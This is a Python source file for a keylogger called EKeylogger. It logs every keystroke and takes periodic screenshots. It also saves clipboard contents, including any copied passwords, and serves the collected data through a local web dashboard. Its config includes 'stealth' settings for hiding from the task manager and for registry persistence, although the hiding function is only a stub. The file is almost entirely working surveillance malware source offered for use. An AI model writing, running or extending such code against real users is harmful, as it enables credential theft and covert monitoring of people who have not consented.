from pynput.keyboard import Key, Listener
import logging
import os
from PIL import ImageGrab
import pyperclip
import threading
from datetime import datetime
import json
from http.server import HTTPServer, BaseHTTPRequestHandler



class EKeylogger:
    def __init__(self):
        self.log_file = "ekeylog.txt"
        self.clipboard_dir = "clipboard_data"
        self.config_file = "keylogger_config.json"
        self.screenshot_dir = "screenshots"
        self.setup_directories()
        self.load_config()
        self.setup_logging()
        self.key_count = 0
        self.screenshot_interval = 25
        self.clipboard_interval = 25
        self.clipboard_history = []
        self.last_clipboard_content = ""
        self.web_server = None
        self.web_port = 8080
        
    def load_config(self):
        default_config = {
            "stealth": {
                "hide_from_taskmanager": True,
                "registry_persistence": False
            },
            "logging": {
                "clipboard_interval": 25
            },
            "web_interface": {
                "enabled": True,
                "port": 8080
            }
        }
        
        try:
            if os.path.exists(self.config_file):
                with open(self.config_file, 'r') as f:
                    self.config = json.load(f)
            else:
                self.config = default_config
                self.save_config()
        except Exception as e:
            print(f"Config loading error: {e}")
            self.config = default_config
            
    def save_config(self):
        try:
            with open(self.config_file, 'w') as f:
                json.dump(self.config, f, indent=4)
        except Exception as e:
            print(f"Config saving error: {e}")
        
    def setup_directories(self):
        if not os.path.exists(self.screenshot_dir):
            os.makedirs(self.screenshot_dir)
        if not os.path.exists(self.clipboard_dir):
            os.makedirs(self.clipboard_dir)
            
    def setup_logging(self):
        logging.basicConfig(
            filename=self.log_file,
            level=logging.DEBUG,
            format='%(asctime)s: %(message)s'
        )
        
        
    def take_screenshot(self):
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"{self.screenshot_dir}/screenshot_{timestamp}.png"
            screenshot = ImageGrab.grab()
            screenshot.save(filename)
            logging.info(f"Screenshot saved: {filename}")
            return filename
        except Exception as e:
            logging.error(f"Screenshot error: {e}")
            return None
        
    def capture_clipboard(self):
        try:
            current_clipboard = pyperclip.paste()
            
            if current_clipboard != self.last_clipboard_content and current_clipboard.strip():
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"{self.clipboard_dir}/clipboard_{timestamp}.txt"
                
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(f"Timestamp: {datetime.now().isoformat()}\n")
                    f.write(f"Content Length: {len(current_clipboard)} characters\n")
                    f.write("-" * 50 + "\n")
                    f.write(current_clipboard)
                
                # Store in history
                clipboard_entry = {
                    'timestamp': datetime.now().isoformat(),
                    'content': current_clipboard[:200] + "..." if len(current_clipboard) > 200 else current_clipboard,
                    'full_content': current_clipboard,
                    'filename': filename
                }
                self.clipboard_history.append(clipboard_entry)
                
                self.last_clipboard_content = current_clipboard
                logging.info(f"Clipboard captured: {filename}")
                print(f"Clipboard captured: {len(current_clipboard)} characters")
                
                return filename
                
        except Exception as e:
            logging.error(f"Clipboard capture failed: {e}")
            return None
            
    def hide_from_taskmanager(self):
        try:
            current_pid = os.getpid()
            logging.info(f"Process hiding: PID {current_pid}")
            print("Process hiding implemented (basic level)")
            return True
            
        except Exception as e:
            logging.error(f"Process hiding failed: {e}")
            return False
            
    def generate_clipboard_report(self):
        try:
            report = {
                'timestamp': datetime.now().isoformat(),
                'total_keystrokes': self.key_count,
                'total_clipboard_captures': len(self.clipboard_history),
                'clipboard_history': self.clipboard_history
            }
            
            # Save report to file
            report_file = f"clipboard_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            with open(report_file, 'w', encoding='utf-8') as f:
                json.dump(report, f, indent=4, ensure_ascii=False)
                
            logging.info(f"Clipboard report generated: {report_file}")
            print(f"Clipboard report generated: {report_file}")
            
            return report_file
            
        except Exception as e:
            logging.error(f"Report generation failed: {e}")
            return None
            
    def start_web_interface(self):
        try:
            class KeyloggerHandler(BaseHTTPRequestHandler):
                def do_GET(self):
                    if self.path == '/':
                        self.send_response(200)
                        self.send_header('Content-type', 'text/html')
                        self.end_headers()
                        
                        html_content = self.generate_dashboard_html()
                        self.wfile.write(html_content.encode('utf-8'))
                        
                    elif self.path == '/data':
                        self.send_response(200)
                        self.send_header('Content-type', 'application/json')
                        self.end_headers()
                        
                        data = {
                            'keystrokes': self.server.keylogger.key_count,
                            'clipboard_captures': len(self.server.keylogger.clipboard_history),
                            'clipboard_history': self.server.keylogger.clipboard_history[-10:],  # Last 10 entries
                            'log_file': self.server.keylogger.log_file,
                            'timestamp': datetime.now().isoformat()
                        }
                        self.wfile.write(json.dumps(data, indent=2, ensure_ascii=False).encode('utf-8'))
                        
                    else:
                        self.send_response(404)
                        self.end_headers()
                        
                def generate_dashboard_html(self):
                    with open('key.html', 'r', encoding='utf-8') as f:
                        generate_dashboard_html = f.read()
                    return generate_dashboard_html
                    
                
                    
            # Create server
            self.web_server = HTTPServer(('localhost', self.web_port), KeyloggerHandler)
            self.web_server.keylogger = self 
            server_thread = threading.Thread(target=self.web_server.serve_forever, daemon=True)
            server_thread.start()
            
            print(f"Web interface started at: http://localhost:{self.web_port}")
            logging.info(f"Web interface started at port {self.web_port}")
            
        except Exception as e:
            logging.error(f"Web interface failed to start: {e}")
            print(f"Web interface failed to start: {e}")
            
    def on_press(self, key):
        self.key_count += 1
        if self.key_count % self.screenshot_interval == 0:
            screenshot_path = self.take_screenshot()
            if screenshot_path:
                print(f"Screenshot taken: {screenshot_path}")
        try:
            key_char = key.char if hasattr(key, 'char') else str(key)
            log_entry = f'Key pressed: {key_char}'
            logging.info(log_entry)
            print(f'Key: {key_char}')
        except AttributeError:
            log_entry = f'Special key pressed: {key}'
            logging.info(log_entry)
            print(f'Special: {key}')
            
        # Capture clipboard 
        if self.key_count % self.clipboard_interval == 0:
            clipboard_path = self.capture_clipboard()
            if clipboard_path:
                print(f"Clipboard captured: {clipboard_path}")
                
    def on_release(self, key):
        """Handle key release events"""
        if key == Key.esc:
            print("Keylogger stopped by user (ESC pressed)")
            self.generate_clipboard_report()
            return False
            
    def start(self):
        print("EKeylogger Starting...")
        print("=" * 50)
        
        # Apply stealth
        if self.config['stealth']['hide_from_taskmanager']:
            print("Applying process hiding...")
            self.hide_from_taskmanager()
            
        # Start web interface
        if self.config['web_interface']['enabled']:
            print("Starting web interface...")
            self.start_web_interface()
        
        print("=" * 50)
        print(f"Logging to: {self.log_file}")
        print(f"Screenshots saved to: {self.screenshot_dir}")
        print(f"Screenshot taken every {self.screenshot_interval} keystrokes")
        print(f"Clipboard data saved to: {self.clipboard_dir}")
        print(f"Clipboard captured every {self.clipboard_interval} keystrokes")
        print(f"Web interface: http://localhost:{self.web_port}")
        print("Press ESC to stop")
        print("=" * 50)
        
        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()

if __name__ == "__main__":        
    keylogger = EKeylogger()
    keylogger.start()

